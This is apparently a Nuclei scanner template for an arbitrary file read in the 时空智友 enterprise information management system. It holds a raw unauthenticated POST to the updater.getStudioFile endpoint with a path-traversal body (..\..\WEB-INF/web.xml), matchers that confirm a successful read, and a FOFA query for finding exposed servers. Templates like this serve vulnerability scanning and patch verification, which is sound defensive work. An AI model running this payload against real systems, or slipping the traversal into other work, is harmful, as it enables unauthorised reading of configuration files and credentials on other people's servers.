http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - <?xml version="1.0"
            - <web-app
            - </web-app>
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /formservice?service=updater.getStudioFile HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
          Content-Type: application/json

          ..\..\WEB-INF/web.xml
id: shikongzhiyou-updater_getStudioFile-File-reading
info:
    author: Superhero
    description: |-
        fofa: body="时空智友企业信息管理"
        时空智友 企业信息管理系统 updater.getStudioFile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 时空智友 企业信息管理系统 updater.getStudioFile 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/a2YcdkUH_L-dtosL_yWlBQ
    severity: high
    tags:
        - File reading
        - Kong
        - 时空智友企业信息管理
